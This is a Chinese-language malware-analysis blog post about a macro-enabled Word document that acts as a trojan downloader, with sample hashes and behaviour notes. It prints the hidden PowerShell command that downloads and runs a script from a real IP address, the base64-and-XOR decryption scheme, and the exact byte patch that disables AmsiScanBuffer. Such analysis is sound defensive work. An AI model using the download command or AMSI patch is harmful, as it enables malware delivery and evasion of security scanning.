---
layout:     post
title:      恶意软件分析（三）：木马下载器分析
subtitle:   doc格式木马分析
date:       2021-12-11
author:     Hongtai S
header-img: img/18.jpg
catalog: true
tags:
    - 逆向
    - 二进制
    - 恶意代码分析
---
# 样本基本信息

样本文件名称：41f9313ea03c2cbbd5f5fdc566a8acaf.doc

样本MD5：41f9313ea03c2cbbd5f5fdc566a8acaf

样本SHA-1：4392d9a81ca7e6e25a044469896967d64b2eb4d8

样本SHA-256：f5ce7b2aaf9eef16686770de396a444ca76348e50af64e18b4f034e22ba2a8e3

样本文件格式：样本为doc文件，使用oledump分析发现包含启用宏的vbs脚本。

![1.png](https://s2.loli.net/2022/02/09/lwu45M1GE3QYRnP.png)

# 样本行为分析

## 打开powershell.exe，从指定的url中下载powershell脚本

![2.png](https://s2.loli.net/2022/02/09/9brWx1K4sRN8ZeF.png)

启动命令行为
"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -win hidden IE`x(new-object net.webclient).downloadstring('http://106.55.36.79/nsload')

![3.png](https://s2.loli.net/2022/02/09/PD2WRHop4mzqxKf.png)

## 解密恶意代码并执行

从http://106.55.36.79/nsload链接下载的powershell脚本内容包含一个加密的字符串、相应的解密代码和执行代码。

![4.png](https://s2.loli.net/2022/02/09/tCpUs6JabLAOG8v.png)

解密算法使用base64解码算法解码字符串后与0x76异或，将解密的字符串写入文件，发现是.net编写的PE文件

![5.png](https://s2.loli.net/2022/02/09/zgQDcUZ3l2HXtuv.png)

## 修改AmsiScanBuffer逃避检测

首先获取amsi.dll中的DllCanUnloadNow()函数的地址，通过判断指针类型的大小，检测当前进程是32位进程还是64位进程

![6.png](https://s2.loli.net/2022/02/09/75keOinAsLR3qEg.png)

从DllCanUnloadNow()函数代码的起始地址（0x6D6E3C10）开始逐字节搜索匹配的一段字节，在0x6D6E45B0处匹配到

![7.png](https://s2.loli.net/2022/02/09/KfsTLbE6D2GgFM1.png)

修改这段代码所在的内存的权限为PAGE_READWRITE，然后使用指定的一段字节修改上一步匹配到的内存内容。
搜索内容（原内容）为：8BFF558BEC83EC185356
修改后的内容为：B857000780C21800

![8.png](https://s2.loli.net/2022/02/09/guXB75j3pYZaSHo.png)

在ida中查看被修改的内容，原代码为：

![9.png](https://s2.loli.net/2022/02/09/FwyIqoYRB6zKPjT.png)

修改后直接返回参数无效错误：

![10.png](https://s2.loli.net/2022/02/09/b64qVxY7fL3Bcz1.png)

[微软官网](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer)是这样介绍被修改的这个函数的：

Scans a buffer-full of content for malware.

扫描充满恶意软件的缓冲区。

该木马功能应该是修改Windows系统的恶意软件检测功能，使自身或其他木马不被发现。